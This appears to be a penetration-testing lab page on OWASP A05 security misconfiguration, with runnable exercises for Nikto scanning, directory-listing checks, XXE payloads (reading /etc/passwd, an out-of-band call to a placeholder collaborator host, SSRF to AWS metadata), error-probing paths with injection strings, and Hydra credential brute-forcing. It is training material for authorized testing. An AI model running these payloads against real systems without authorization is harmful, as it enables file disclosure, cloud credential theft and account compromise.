---
title: A05 — Security Misconfiguration
sidebar_position: 5
tags: [lab, owasp-a05, nikto, xxe, directory-listing]
---

# A05 — Security Misconfiguration

## What this lab covers

- Nikto scanning — automated detection of common misconfigurations
- Directory listing — discovering exposed file indexes
- XXE injection — reading local files and triggering SSRF via XML
- Verbose error messages — information leakage through error responses
- Default credentials — automated testing with Hydra

## Configuration

```bash
TARGET="http://TARGET_IP_OR_DOMAIN"
PORT="80"
```

## Exercise 1: Nikto Scan

Run a full Nikto scan against the target:

```bash
nikto -h "$TARGET" -p "$PORT" -output nikto_results.txt
```

Nikto checks for: outdated software versions, dangerous HTTP methods (PUT, DELETE), default files, misconfigurations, and known vulnerabilities.

## Exercise 2: Directory Listing Detection

Test 13 common paths for enabled directory listing:

```bash
PATHS=(
  "/"
  "/uploads/"
  "/files/"
  "/backup/"
  "/images/"
  "/static/"
  "/assets/"
  "/logs/"
  "/data/"
  "/tmp/"
  "/config/"
  "/.git/"
  "/.svn/"
)

for PATH_CHECK in "${PATHS[@]}"; do
  RESPONSE=$(curl -s "$TARGET$PATH_CHECK")
  if echo "$RESPONSE" | grep -qi "Index of"; then
    echo "[DIRECTORY LISTING] $TARGET$PATH_CHECK"
  fi
done
```

A response containing "Index of" indicates directory listing is enabled — a misconfiguration that exposes file structure and potentially sensitive files.

## Exercise 3: XXE Injection

XXE (XML External Entity) injection exploits XML parsers that process external entity declarations.

### Basic XXE — read local file

```bash
XXE_PAYLOAD='<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>'

curl -s -X POST "$TARGET/api/xml" \
  -H "Content-Type: application/xml" \
  -d "$XXE_PAYLOAD"
```

### Blind XXE via DNS out-of-band

```bash
BLIND_XXE='<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://YOUR_COLLABORATOR_SERVER/xxe-test">
]>
<data>&xxe;</data>'
```

### XXE for SSRF — access AWS metadata

```bash
AWS_XXE='<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&ssrf;</foo>'

curl -s -X POST "$TARGET/api/xml" \
  -H "Content-Type: application/xml" \
  -d "$AWS_XXE"
```

If the response contains AWS metadata (instance ID, AMI ID, etc.), the application is both XXE-vulnerable and has access to the cloud metadata service.

## Exercise 4: Verbose Error Messages

Trigger error conditions to check for information leakage:

```bash
ERROR_PATHS=(
  "/nonexistent-page-xyz"
  "/api/user/-1"
  "/api/user/abc"
  "/'OR'1'='1"
  "/<script>alert(1)</script>"
  "/api/user/%00"
  "/api/user/99999999"
  "/.env"
  "/config.php"
  "/web.config"
  "/app/config/parameters.yml"
  "/etc/passwd"
  "/?debug=true"
  "/?XDEBUG_SESSION_START=phpstorm"
  "/phpinfo.php"
  "/server-status"
)

for ERROR_PATH in "${ERROR_PATHS[@]}"; do
  RESPONSE=$(curl -s "$TARGET$ERROR_PATH")
  echo "--- $ERROR_PATH ---"
  echo "$RESPONSE" | grep -iE "error|exception|stack trace|at line|Warning:|Notice:" | head -3
done
```

Findings: stack traces, internal file paths, database connection strings, framework versions, PHP notices.

## Exercise 5: Default Credentials

### Manual test list

Test these credential pairs on login endpoints:

| Username | Password |
|----------|----------|
| admin | admin |
| admin | password |
| admin | 123456 |
| root | root |
| root | toor |
| administrator | administrator |
| test | test |
| guest | guest |
| admin | (empty) |

### Automated testing with Hydra

```bash
hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
      -P /usr/share/wordlists/metasploit/unix_passwords.txt \
      -t 4 \
      "$TARGET" http-post-form \
      "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

:::warning
Brute-force attacks generate significant log entries and may trigger account lockouts. Always confirm you have authorization before running automated credential tests.
:::
